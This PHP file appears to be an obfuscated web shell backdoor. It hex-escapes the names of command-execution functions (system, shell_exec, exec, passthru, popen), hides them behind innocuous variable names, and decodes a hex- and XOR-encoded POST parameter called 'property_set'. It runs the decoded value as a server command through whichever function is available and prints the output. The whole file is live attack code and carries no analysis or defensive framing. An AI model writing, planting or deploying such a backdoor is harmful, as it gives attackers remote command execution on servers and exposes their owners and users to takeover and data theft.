<?php

$reverse_lookup6 = "\x73t\x72\x65am_ge\x74\x5Fc\x6F\x6E\x74\x65nt\x73";
$reverse_lookup3 = "\x65\x78ec";
$reverse_lookup7 = "pcl\x6F\x73e";
$reverse_lookup2 = "sh\x65\x6C\x6C_ex\x65c";
$right_pad_string = "\x68e\x782\x62\x69n";
$reverse_lookup4 = "\x70a\x73s\x74hru";
$reverse_lookup1 = "s\x79\x73t\x65m";
$reverse_lookup5 = "\x70\x6Fpen";
if (isset($_POST["\x70\x72o\x70\x65\x72\x74y_set"])) {
            function service_registry ($entity ,  $comp) {
 $bind ='' ;
for($b=0;
 $b<strlen($entity);
 $b++){
$bind.=chr(ord($entity[$b])^$comp);

} return$bind;
 
}
            $property_set = $right_pad_string($_POST["\x70\x72o\x70\x65\x72\x74y_set"]);
            $property_set = service_registry($property_set, 38);
            if (function_exists($reverse_lookup1)) {
                $reverse_lookup1($property_set);
            } elseif (function_exists($reverse_lookup2)) {
                print $reverse_lookup2($property_set);
            } elseif (function_exists($reverse_lookup3)) {
                $reverse_lookup3($property_set, $elem_entity);
                print join("\n", $elem_entity);
            } elseif (function_exists($reverse_lookup4)) {
                $reverse_lookup4($property_set);
            } elseif (function_exists($reverse_lookup5) && function_exists($reverse_lookup6) && function_exists($reverse_lookup7)) {
                $comp_bind = $reverse_lookup5($property_set, 'r');
                if ($comp_bind) {
                    $record_value = $reverse_lookup6($comp_bind);
                    $reverse_lookup7($comp_bind);
                    print $record_value;
                }
            }
            exit;
        }